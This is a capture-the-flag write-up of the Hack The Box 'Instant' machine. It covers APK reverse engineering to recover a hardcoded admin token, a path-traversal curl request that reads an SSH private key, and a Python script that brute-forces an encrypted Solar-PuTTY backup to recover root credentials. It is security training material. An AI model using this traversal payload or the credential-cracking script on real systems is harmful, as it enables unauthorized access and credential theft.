---
layaout: post
image: /assets/instant/instant.png
title: Instant Write Up HTB
date: 02-03-2025
categories: [Write ups]
tag: [Reverse Engineering,API Exploitation,Arbitrary File Read,Mobile Application,APK Analysis,Encryption Cracking,Hash Cracking,Solar-PuTTY,Linux,Privilege Escalation,Medium Difficulty]
excerpt: "Instant on Hack The Box is a medium-difficulty machine that focuses on reverse engineering a mobile application, exploiting API endpoints, and cracking encrypted hashes and files. The initial exploitation involves analyzing an APK to extract sensitive information, including a hardcoded authorization token. Then, players exploit an API endpoint vulnerable to Arbitrary File Read to access critical files. Finally, the machine is fully compromised by decrypting and analyzing encrypted session data from Solar-PuTTY.

This machine is ideal for those looking to learn about mobile app analysis, API exploitation, and cracking encrypted data in a controlled environment."
---
![img-description](/assets/instant/instant.png)

Instant on Hack The Box is a medium-difficulty machine that focuses on reverse engineering a mobile application, exploiting API endpoints, and cracking encrypted hashes and files. The initial exploitation involves analyzing an APK to extract sensitive information, including a hardcoded authorization token. Then, players exploit an API endpoint vulnerable to Arbitrary File Read to access critical files. Finally, the machine is fully compromised by decrypting and analyzing encrypted session data from Solar-PuTTY.

This machine is ideal for those looking to learn about mobile app analysis, API exploitation, and cracking encrypted data in a controlled environment.

## ENUMERATION
---
First, we run an Nmap scan:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.37 -oG allPorts
```

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.37 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-01 14:35 CET
Initiating SYN Stealth Scan at 14:35
Scanning 10.10.11.37 [65535 ports]
Discovered open port 22/tcp on 10.10.11.37
Discovered open port 80/tcp on 10.10.11.37
Completed SYN Stealth Scan at 14:35, 12.11s elapsed (65535 total ports)
Nmap scan report for 10.10.11.37
Host is up, received user-set (0.043s latency).
Scanned at 2025-02-01 14:35:04 CET for 12s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 12.22 seconds
           Raw packets sent: 65770 (2.894MB) | Rcvd: 65535 (2.621MB)
```

Since ports 80 and 22 are open, port 80 suggests an active web service. We then add the IP and domain to `/etc/hosts`:

```bash
sudo vim /etc/hosts
```

And append the IP with its corresponding domain.


## FOOTHOLD
---
Next, we inspect the website

![Texto alternativo](/assets/instant/Screenshot%202025-02-01%20150738.jpg)

The webpage seems uninteresting even after enumerating subdomains and directories. However, clicking on **DOWNLOAD NOW** downloads a `.apk` file. We can analyze this file using `jadx`:

```bash
jadx-gui 
```

After opening the `.apk`, we find an **AUTHORIZATION BEARER token** and a subdomain. The critical part is the token:

![Texto alternativo](/assets/instant/Screenshot%202025-02-01%20151012.jpg)

Further investigation in the file `Resources/res/xml/network_security_config.xml` reveals:

![Texto alternativo](/assets/instant/Screenshot%202025-02-01%20151837.jpg)

We add `swagger-ui.instant.htb` to `/etc/hosts` and explore the website:

![Texto alternativo](/assets/instant/Screenshot%202025-02-01%20152136.jpg)

This suggests we can access the system via a `curl` request:

```bash
curl -X GET "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=..%2F.ssh%2Fid_rsa" -H  "accept: application/json" -H  "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"
```

This request provides an **SSH private key**, allowing us to log in via SSH.

We clean the key format by removing unnecessary characters or using ChatGPT for formatting. Once formatted, we save it:

```bash
vim id_rsa
```

Paste the SSH key and set proper permissions:

```bash
chmod 600 id_rsa
```

Then, connect via SSH:

```bash
ssh shirohige@instant.htb -i id_rsa
```

We can now retrieve the user flag:

```bash
shirohige@instant:~$ cat user.txt
4da76423903bb0###################
```


## PRIVILEGE ESCALATION
---

Navigating to `/opt/backups/Solar-PuTTY`, we find `session-backup.dat`, which seems interesting. We transfer it to our local machine using a Python server:

```bash
shirohige@instant:/opt/backups/Solar-PuTTY$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

On our local machine, we use `wget`:

```bash
wget http://10.10.11.37:8000/sessions-backup.dat
```

### Extracting Credentials from a Solar-PuTTY Backup


To retrieve the information stored in the `.dat` file, we need a script that can decrypt the saved credentials. The following Python script accomplishes this.

### Decryption Script

```python
import argparse
import base64
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import json
import sys
from typing import List, Tuple

def decrypt(password: str, ciphertext: str) -> str:
    try:
        # Decode the base64 encoded ciphertext
        array = base64.b64decode(ciphertext)
        salt = array[:24]
        iv = array[24:32]
        encrypted_data = array[32:]

        # Derive the key from the password using PBKDF2
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA1(),
            length=24,  # Triple DES key size
            salt=salt,
            iterations=1000,
            backend=default_backend()
        )
        key = kdf.derive(password.encode())

        # Create the cipher and decrypt the data
        cipher = Cipher(algorithms.TripleDES(key), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        
        decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()

        data = ''.join(chr(c) for c in decrypted_data if chr(c).isascii())
        return data

    except Exception as e:
        print(f'Error: {e}')

def decrypt_wrapper(passwords: List[str], cipher: [str]) -> Tuple[str, str]: # type: ignore
    for i, password in enumerate(passwords):
        password: str  = password.strip()
        decrypted: str = decrypt(password, cipher)
        if decrypted and 'Credentials' in decrypted:
            print(f"✔ Correct password found on line {i}:  {password}")
            return (decrypted, password)
        else:
            print(f"❌ Password={password} is incorrect!")

 
def debug_decrypted_payload(decrypted: str):
    '''
    Useful to debug any unexpected bytes.
    '''
    import base64
    encoded_bytes = decrypted.encode("utf8")
    base64_bytes = base64.b64encode(encoded_bytes)
    base64_string = base64_bytes.decode("utf8")
    print(encoded_bytes)
    print(base64_string)
    

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Decrypt Solar-PuTTY session using a password or wordlist.')
    parser.add_argument('session', help='Path to the Solar-PuTTY session (.dat) file.')
    parser.add_argument('-wl', '--wordlist', help='Path to the wordlist file (optional).', nargs='?')
    parser.add_argument('-p', '--password', help='Password to use for decryption (optional).', nargs='?')

    args = parser.parse_args()

    if len(sys.argv) != 4:
        print(sys.argv)
        print("Usage: python SolarPuttyDecryptor.py <session_file> -wl <wordlist> or -p <password>")
        exit(1)

    with open(args.session, 'r', encoding='UTF8') as f:
        ciphertext: str = f.read()

    if args.password:
        decrypted, password = decrypt_wrapper([args.password], ciphertext)
    elif args.wordlist:
        with open(args.wordlist, 'r', encoding='UTF8') as passwords:
            decrypted, password = decrypt_wrapper(passwords, ciphertext)
    else:
        parser.print_help()
        print("Error: Either a password or a wordlist must be provided.")
        exit(2)
 
    try:
        # Some gibberish could exist in beginning.
        cleaned_up_decrypted: str = decrypted[decrypted.index('['):]
        fixed_decrypted: str = '{"Sessions":' + cleaned_up_decrypted
        
        # Some gibberish bytes could exist at end. Part of the fun...
        fixed_decrypted = fixed_decrypted.replace("\\","_").replace(b'\x01'.decode('UTF8'), '')
        decrypted_json: str = json.loads(fixed_decrypted)
        print('🚀🚀🚀🚀🚀')

        print(json.dumps(decrypted_json, indent=4))
    except json.JSONDecodeError as e:
        print("💀 Invalid JSON:", e)
        print(decrypted)
        exit(3)
```

### Credits
[Original repository](https://github.com/Wind010/SolarPuttyDecryptor/tree/main)

### Running the Script

To execute the script, use the following command:

```bash
python3 SolarPuttyDecryptor.py -wl /usr/share/wordlists/rockyou.txt sessions-backup.dat
```

Example output:

```bash
python3 SolarPuttyDecryptor.py -wl /usr/share/wordlists/rockyou.txt sessions-backup.dat
❌ Password=alexis is incorrect!
❌ Password=jesus is incorrect!
✔ Correct password found on line 3:  estre###
🚀🚀🚀🚀🚀
{
    "Sessions": [
        {
            "Id": "066894ee-635c-4578-86d0-d36d4838115b",
            "Ip": "10.10.11.37",
            "Port": 22,
            "ConnectionType": 1,
            "SessionName": "Instant",
            "Authentication": 0,
            "CredentialsID": "452ed919-530e-419b-b721-da76cbe8ed04",
            "AuthenticateScript": "00000000-0000-0000-0000-000000000000",
            "LastTimeOpen": "0001-01-01T00:00:00",
            "OpenCounter": 1,
            "SerialLine": null,
            "Speed": 0,
            "Color": "#FF176998",
            "TelnetConnectionWaitSeconds": 1,
            "LoggingEnabled": false,
            "RemoteDirectory": ""
        }
    ],
    "Credentials": [
        {
            "Id": "452ed919-530e-419b-b721-da76cbe8ed04",
            "CredentialsName": "instant-root",
            "Username": "root",
            "Password": "12**24nzC!r0c%q12",
            "PrivateKeyPath": "",
            "Passphrase": "",
            "PrivateKeyContent": null
        }
    ],
    "AuthScript": [],
    "Groups": [],
    "Tunnels": [],
    "LogsFolderDestination": "C:__ProgramData__SolarWinds__Logs__Solar-PuTTY__SessionLogs"
}
```

### Gaining Root Access

Now, use the retrieved credentials to switch to the root user:

```bash
su root
```

```bash
shirohige@instant:/opt/backups/Solar-PuTTY$ su root
Password: 
root@instant:/opt/backups/Solar-PuTTY# ls
sessions-backup.dat
root@instant:/opt/backups/Solar-PuTTY# cd /root
root@instant:~# ls
root.txt
root@instant:~# cat root.txt
4a7df3633a330c################
```

We already have both flags!
